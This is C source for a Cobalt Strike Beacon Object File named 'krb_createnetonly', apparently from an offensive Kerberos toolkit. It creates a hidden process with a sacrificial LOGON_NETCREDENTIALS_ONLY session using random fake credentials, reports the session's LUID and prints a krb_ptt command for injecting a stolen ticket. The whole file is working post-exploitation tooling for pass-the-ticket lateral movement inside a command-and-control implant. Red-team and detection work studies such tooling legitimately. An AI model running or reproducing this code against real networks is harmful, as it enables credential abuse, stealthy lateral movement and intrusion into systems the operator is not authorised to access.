/*
 * krb_createnetonly - Create process with LOGON_NETCREDENTIALS_ONLY
 *
 * Creates a new process with a "sacrificial" logon session that can be
 * used for pass-the-ticket without affecting the current session.
 *
 * Usage: krb_createnetonly /program:PATH [/show] [/ticket:BASE64]
 */

/* Include krb5_struct.h first - it includes winsock2.h before windows.h */
#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

#define SECURITY_WIN32
#include <sspi.h>
#include <ntsecapi.h>


DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CreateProcessWithLogonW(
    LPCWSTR lpUsername,
    LPCWSTR lpDomain,
    LPCWSTR lpPassword,
    DWORD dwLogonFlags,
    LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);

DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
/* CryptGenRandom already declared in krb5_utils.h */

/* Logon flags */
#define LOGON_WITH_PROFILE          0x00000001
#define LOGON_NETCREDENTIALS_ONLY   0x00000002
#define LOGON_ZERO_PASSWORD_BUFFER  0x80000000

/* Creation flags */
#define CREATE_SUSPENDED            0x00000004
#define CREATE_NEW_CONSOLE          0x00000010
#define CREATE_NO_WINDOW            0x08000000

/* Generate random string for fake credentials */
static void generate_random_string(char* buf, int len) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    HCRYPTPROV hProv;

    if (ADVAPI32$CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        BYTE randomBytes[32];
        if (ADVAPI32$CryptGenRandom(hProv, len, randomBytes)) {
            for (int i = 0; i < len; i++) {
                buf[i] = charset[randomBytes[i] % (sizeof(charset) - 1)];
            }
        }
        ADVAPI32$CryptReleaseContext(hProv, 0);
    } else {
        /* Fallback to simple pseudo-random */
        for (int i = 0; i < len; i++) {
            buf[i] = charset[i % (sizeof(charset) - 1)];
        }
    }
    buf[len] = '\0';
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;
    NTSTATUS status;

    BeaconFormatAlloc(&output, 16 * 1024);
    arg_init(&parser, args, alen);

    char* program = arg_get(&parser, "program");
    bool show = arg_exists(&parser, "show");
    char* ticket_b64 = arg_get(&parser, "ticket");

    if (!program) {
        BeaconPrintf(CALLBACK_ERROR, "Usage: krb_createnetonly /program:PATH [/show] [/ticket:BASE64]");
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[*] Action: Create Process (LOGON_NETCREDENTIALS_ONLY)\n\n");
    BeaconFormatPrintf(&output, "[*] Program        : %s\n", program);
    BeaconFormatPrintf(&output, "[*] Show Window    : %s\n", show ? "True" : "False");
    if (ticket_b64) {
        BeaconFormatPrintf(&output, "[*] Ticket         : (will inject after creation)\n");
    }
    BeaconFormatPrintf(&output, "\n");

    /* Generate random username/password for the sacrificial session */
    char randomUser[16];
    char randomPass[16];
    generate_random_string(randomUser, 8);
    generate_random_string(randomPass, 12);

    /* Convert to wide strings */
    WCHAR wProgram[MAX_PATH];
    WCHAR wUser[32];
    WCHAR wPass[32];
    WCHAR wDomain[8] = L".";  /* Local computer */

    MSVCRT$mbstowcs(wProgram, program, MAX_PATH);
    MSVCRT$mbstowcs(wUser, randomUser, 32);
    MSVCRT$mbstowcs(wPass, randomPass, 32);

    /* Setup startup info */
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);

    if (!show) {
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
    }

    DWORD creationFlags = CREATE_SUSPENDED;
    if (!show) {
        creationFlags |= CREATE_NO_WINDOW;
    } else {
        creationFlags |= CREATE_NEW_CONSOLE;
    }

    BeaconFormatPrintf(&output, "[*] Using random credentials: %s:%s\n", randomUser, randomPass);
    BeaconFormatPrintf(&output, "[*] Calling CreateProcessWithLogonW with LOGON_NETCREDENTIALS_ONLY...\n\n");

    /* Create the process with network-only logon */
    BOOL result = ADVAPI32$CreateProcessWithLogonW(
        wUser,                      /* Username */
        wDomain,                    /* Domain (. = local) */
        wPass,                      /* Password */
        LOGON_NETCREDENTIALS_ONLY,  /* Logon flags */
        NULL,                       /* Application name */
        wProgram,                   /* Command line */
        creationFlags,              /* Creation flags */
        NULL,                       /* Environment */
        NULL,                       /* Current directory */
        &si,                        /* Startup info */
        &pi                         /* Process info */
    );

    if (!result) {
        DWORD err = KERNEL32$GetLastError();
        BeaconFormatPrintf(&output, "[-] CreateProcessWithLogonW failed: %d\n", err);

        if (err == 1314) {
            BeaconFormatPrintf(&output, "[!] ERROR_PRIVILEGE_NOT_HELD - may need SeImpersonatePrivilege\n");
        }

        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[+] Process created successfully!\n");
    BeaconFormatPrintf(&output, "    Process ID  : %d\n", pi.dwProcessId);
    BeaconFormatPrintf(&output, "    Thread ID   : %d\n", pi.dwThreadId);

    /* Get the LUID of the new process */
    HANDLE hToken = NULL;
    if (ADVAPI32$OpenProcessToken(pi.hProcess, TOKEN_QUERY, &hToken)) {
        TOKEN_STATISTICS tokenStats;
        DWORD dwSize = 0;

        if (ADVAPI32$GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(tokenStats), &dwSize)) {
            BeaconFormatPrintf(&output, "    LUID        : 0x%X:0x%X\n\n",
                tokenStats.AuthenticationId.HighPart,
                tokenStats.AuthenticationId.LowPart);

            /* If ticket provided, inject it */
            if (ticket_b64) {
                BeaconFormatPrintf(&output, "[*] To inject ticket, use:\n");
                BeaconFormatPrintf(&output, "    krb_ptt /ticket:%s /luid:0x%X\n\n",
                    ticket_b64, tokenStats.AuthenticationId.LowPart);
            }
        }
        KERNEL32$CloseHandle(hToken);
    }

    /* Resume the process if not showing (so it stays hidden but running) */
    /* If showing, resume so user sees the window */
    BeaconFormatPrintf(&output, "[*] Resuming thread...\n");
    ResumeThread(pi.hThread);

    BeaconFormatPrintf(&output, "[+] Process is now running\n");
    BeaconFormatPrintf(&output, "\n[*] This process has a new logon session that can be used for PTT\n");
    BeaconFormatPrintf(&output, "[*] Inject a ticket into this session's LUID to use network credentials\n");

    /* Close handles */
    KERNEL32$CloseHandle(pi.hThread);
    KERNEL32$CloseHandle(pi.hProcess);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));

cleanup:
    BeaconFormatFree(&output);
    if (program) free(program);
    if (ticket_b64) free(ticket_b64);
}
